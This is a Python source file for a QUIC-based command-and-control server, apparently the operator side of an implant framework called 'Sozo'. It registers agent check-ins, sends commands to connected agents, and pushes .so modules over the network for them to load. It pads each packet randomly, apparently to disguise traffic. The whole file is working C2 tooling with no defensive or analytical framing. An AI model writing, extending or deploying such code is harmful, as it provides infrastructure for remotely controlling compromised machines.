import asyncio
import os
import ssl
import struct
from typing import Optional

import modules as mod
from aioquic.asyncio import serve
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import (
    ConnectionTerminated,
    HandshakeCompleted,
    QuicEvent,
    StreamDataReceived,
)

HEADER_SIZE = 20  # u64 total_size + u32 identity + u32 data_len + u32 pad_len

# Injected by bridge.py
event_queue: asyncio.Queue | None = None

# conn_identity (int) → SozoServerProtocol
active_connections: dict[int, "SozoServerProtocol"] = {}


# ---------------------------------------------------------------------------
# Packet builder
# ---------------------------------------------------------------------------


def craft_packet(identity: int, data: bytes) -> bytes:
    data_len = len(data)
    min_pad = max(int(data_len * 0.05), 1)
    max_pad = max(int(data_len * 0.15), min_pad + 1)
    pad_len = os.urandom(1)[0] % (max_pad - min_pad + 1) + min_pad
    padding = os.urandom(pad_len)
    total = HEADER_SIZE + data_len + pad_len
    header = struct.pack(">QIII", total, identity, data_len, pad_len)
    return header + data + padding


# ---------------------------------------------------------------------------
# Event push
# ---------------------------------------------------------------------------


def _push_event(event: dict) -> None:
    if event_queue is not None:
        try:
            event_queue.put_nowait(event)
        except asyncio.QueueFull:
            pass
    print(f"[SERVER] {event}")


# ---------------------------------------------------------------------------
# Protocol
# ---------------------------------------------------------------------------


class SozoServerProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.conn_identity: int | None = None
        self.peer_addr: str = "unknown"
        self.alias: str | None = None

        # stream_id → ChunkBuffer
        self._chunks: dict[int, mod.ChunkBuffer] = {}

        # stream_id → raw bytes (partial packet accumulation)
        self._stream_buf: dict[int, bytes] = {}

        # stream_id → opcode sent
        self._stream_opcodes: dict[int, int] = {}

        # stream_id → module identity sent
        self._stream_module: dict[int, int] = {}

        # True once the Shell check-in has been received
        self._checkin_received: bool = False

        # True while a module load sequence is in progress on stream 0.
        # The load response (5 bytes) is handled separately from normal
        # command responses.
        self._load_in_progress: bool = False
        self._load_module_name: str | None = None
        # Command text to retry automatically after a successful load
        self._load_pending_cmd: str | None = None

    # ── Public API ────────────────────────────────────────────────────────────

    def send_command(self, cmd_text: str) -> bool:
        """
        Resolve cmd_text and send.  Returns True on success.
        Returns False if unrecognised (not loadable either — bridge handles
        the load_required case before calling here).
        """
        result = mod.resolve_command(cmd_text)
        if result is None:
            _push_event(
                {
                    "type": "log",
                    "level": "warn",
                    "msg": f"Unrecognised command '{cmd_text}' — not sent",
                }
            )
            return False

        if isinstance(result, tuple) and result[0] == "load_required":
            # Should not reach here — bridge handles this path
            return False

        module_identity, payload = result
        opcode = payload[0] if payload else -1
        stream_id = 0

        if stream_id in self._chunks:
            _push_event(
                {
                    "type": "log",
                    "level": "warn",
                    "msg": f"send_command('{cmd_text}') blocked — stream {stream_id} still reassembling",
                }
            )
            return False

        self._stream_opcodes[stream_id] = opcode
        self._stream_module[stream_id] = module_identity

        packet = craft_packet(module_identity, payload)
        self._quic.send_stream_data(stream_id=stream_id, data=packet)
        self.transmit()
        return True

    def send_load_sequence(self, module_name: str, pending_cmd: str) -> bool:
        """
        Stream a .so over stream 0:
          Packet 1: craft_packet(LOADER, u32_be_size)
          Packets 2+: craft_packet(LOADER, raw_chunk)  max 4096 bytes each

        Sets _load_in_progress so the next response on stream 0 is treated
        as a load result rather than a command response.

        Returns False if the .so file is not found.
        """
        packets = mod.build_load_packets(module_name)
        if packets is None:
            _push_event(
                {
                    "type": "log",
                    "level": "error",
                    "msg": f"Module file not found: ./modules/{module_name}.so",
                }
            )
            return False

        self._load_in_progress = True
        self._load_module_name = module_name
        self._load_pending_cmd = pending_cmd

        for payload in packets:
            packet = craft_packet(mod.LOADER, payload)
            self._quic.send_stream_data(stream_id=0, data=packet)

        self.transmit()
        _push_event(
            {
                "type": "log",
                "level": "info",
                "msg": f"Loading module '{module_name}' — {len(packets) - 1} chunk(s) sent",
            }
        )
        return True

    def set_alias(self, alias: str) -> None:
        self.alias = alias.strip() or None
        _push_event(
            {
                "type": "alias",
                "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                "alias": self.alias,
            }
        )

    # ── QUIC events ───────────────────────────────────────────────────────────

    def quic_event_received(self, event: QuicEvent) -> None:
        if isinstance(event, HandshakeCompleted):
            self.conn_identity = id(self) & 0xFFFFFFFF
            try:
                addr = self._quic._network_paths[0].addr
                self.peer_addr = f"{addr[0]}:{addr[1]}"
            except Exception:
                self.peer_addr = "unknown"

            active_connections[self.conn_identity] = self
            _push_event(
                {
                    "type": "conn",
                    "id": hex(self.conn_identity),
                    "addr": self.peer_addr,
                    "alpn": self._quic.tls._alpn_protocols,
                    "alias": self.alias,
                }
            )

        elif isinstance(event, StreamDataReceived):
            self._handle_stream_data(event.stream_id, event.data)

        elif isinstance(event, ConnectionTerminated):
            if self.conn_identity and self.conn_identity in active_connections:
                del active_connections[self.conn_identity]
            _push_event(
                {
                    "type": "disc",
                    "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                    "addr": self.peer_addr,
                    "alias": self.alias,
                    "reason": event.reason_phrase or "connection closed",
                }
            )

    # ── Stream data handling ──────────────────────────────────────────────────

    def _handle_stream_data(self, stream_id: int, raw: bytes) -> None:
        self._stream_buf[stream_id] = self._stream_buf.get(stream_id, b"") + raw
        buf = self._stream_buf[stream_id]
        offset = 0

        while offset < len(buf):
            if len(buf) - offset < HEADER_SIZE:
                break

            total_size, module_identity, data_len, pad_len = struct.unpack_from(
                ">QIII", buf, offset
            )
            packet_end = offset + total_size
            if len(buf) < packet_end:
                break

            inner = buf[offset + HEADER_SIZE : offset + HEADER_SIZE + data_len]
            self._handle_inner(stream_id, module_identity, inner)
            offset = packet_end

        self._stream_buf[stream_id] = buf[offset:]

    def _handle_inner(self, stream_id: int, module_identity: int, inner: bytes) -> None:
        # ── Check-in ──────────────────────────────────────────────────────────
        if module_identity == mod.SHELL and not self._checkin_received:
            self._checkin_received = True
            decoded = mod._decode_checkin(inner)
            _push_event(
                {
                    "type": "checkin",
                    "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                    "addr": self.peer_addr,
                    "alias": self.alias,
                    "module": hex(module_identity),
                    "data": decoded,
                }
            )
            return

        # ── Load response ─────────────────────────────────────────────────────
        # The load response routes back with SHELL identity — all agent output
        # goes through the shell module so we cannot key on module_identity.
        # _load_in_progress is the sole discriminator. It is safe because Shell
        # is a sync single-stream module — when _load_in_progress is True, the
        # busy lock guarantees no other command is in-flight, so the next
        # response on stream 0 is always the load result.
        if self._load_in_progress:
            self._handle_load_response(inner)
            return

        # ── Normal chunk reassembly ───────────────────────────────────────────
        existing_buf = self._chunks.get(stream_id)

        if existing_buf is None:
            result = mod.parse_initial_chunk(inner)
            if result is None:
                _push_event(
                    {
                        "type": "log",
                        "level": "warn",
                        "msg": f"Could not parse initial chunk ({len(inner)}B) from {self.peer_addr}",
                    }
                )
                return
            total_chunks, retcode, chunk_data, total_data_len = result
            buf = mod.ChunkBuffer(
                total_data_len=total_data_len,
                retcode=retcode,
                total_chunks=total_chunks,
            )
            buf.chunks[0] = chunk_data
            if buf.complete:
                self._finalize(stream_id, module_identity, buf)
            else:
                self._chunks[stream_id] = buf
            return

        result = mod.parse_continuation_chunk(inner)
        if result is None:
            _push_event(
                {
                    "type": "log",
                    "level": "warn",
                    "msg": f"Could not parse continuation chunk ({len(inner)}B) from {self.peer_addr}",
                }
            )
            return
        chunk_idx, total_chunks, chunk_data = result
        existing_buf.chunks[chunk_idx] = chunk_data
        if existing_buf.complete:
            del self._chunks[stream_id]
            self._finalize(stream_id, module_identity, existing_buf)

    def _handle_load_response(self, inner: bytes) -> None:
        """
        Parse the 5-byte loader response and push a load_result event.
        If successful, register the dynamic module and push the pending
        command so bridge.py can automatically retry it.
        """
        module_name = self._load_module_name
        pending_cmd = self._load_pending_cmd

        self._load_in_progress = False
        self._load_module_name = None
        self._load_pending_cmd = None

        retcode, identity = mod.parse_load_response(inner)
        retcode_name = mod.LOAD_ERRORS.get(retcode, f"0x{retcode:02X}")

        if retcode != 0:
            _push_event(
                {
                    "type": "load_result",
                    "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                    "module_name": module_name,
                    "success": False,
                    "error": retcode_name,
                    "identity": None,
                }
            )
            return

        # Register the module so future commands resolve correctly
        mod.register_loaded_module(module_name, identity)

        _push_event(
            {
                "type": "load_result",
                "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                "module_name": module_name,
                "success": True,
                "error": None,
                "identity": hex(identity),
                "pending_cmd": pending_cmd,  # bridge retries this automatically
            }
        )

    def _finalize(
        self, stream_id: int, module_identity: int, buf: "mod.ChunkBuffer"
    ) -> None:
        """Decode a completed ChunkBuffer and push the recv event."""
        opcode = self._stream_opcodes.pop(stream_id, -1)
        stream_module = self._stream_module.pop(stream_id, module_identity)
        rc_name = mod.retcode_name(stream_module, buf.retcode)

        if buf.retcode != 0:
            _push_event(
                {
                    "type": "recv",
                    "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                    "addr": self.peer_addr,
                    "alias": self.alias,
                    "module": hex(module_identity),
                    "error": rc_name,
                    "data": None,
                }
            )
            return

        decoded = mod.decode_response(stream_module, opcode, buf.data)

        _push_event(
            {
                "type": "recv",
                "id": hex(self.conn_identity) if self.conn_identity else "unknown",
                "addr": self.peer_addr,
                "alias": self.alias,
                "module": hex(module_identity),
                "retcode": rc_name,
                "data": decoded,
            }
        )


# ---------------------------------------------------------------------------
# QUIC server
# ---------------------------------------------------------------------------


async def start_quic_server(
    host: str = "0.0.0.0",
    port: int = 4443,
    cert_chain: str = "./certs/server_chain.crt",
    key_file: str = "./certs/server.key",
    ca_cert: str = "./certs/ca.crt",
    idle_timeout: float = 300,
) -> None:
    config = QuicConfiguration(is_client=False)
    config.alpn_protocols = ["sozo"]
    config.idle_timeout = idle_timeout
    config.load_cert_chain(cert_chain, key_file)
    config.verify_mode = ssl.CERT_REQUIRED
    config.load_verify_locations(ca_cert)

    _push_event(
        {
            "type": "log",
            "level": "info",
            "msg": f"QUIC server starting on {host}:{port}",
        }
    )
    server = await serve(
        host=host, port=port, configuration=config, create_protocol=SozoServerProtocol
    )
    _push_event(
        {
            "type": "log",
            "level": "info",
            "msg": f"QUIC server listening on {host}:{port} · ALPN: sozo · mTLS: CERT_REQUIRED",
        }
    )
    try:
        await asyncio.Future()
    finally:
        server.close()


if __name__ == "__main__":
    try:
        asyncio.run(start_quic_server())
    except KeyboardInterrupt:
        print("[SERVER] shutting down")
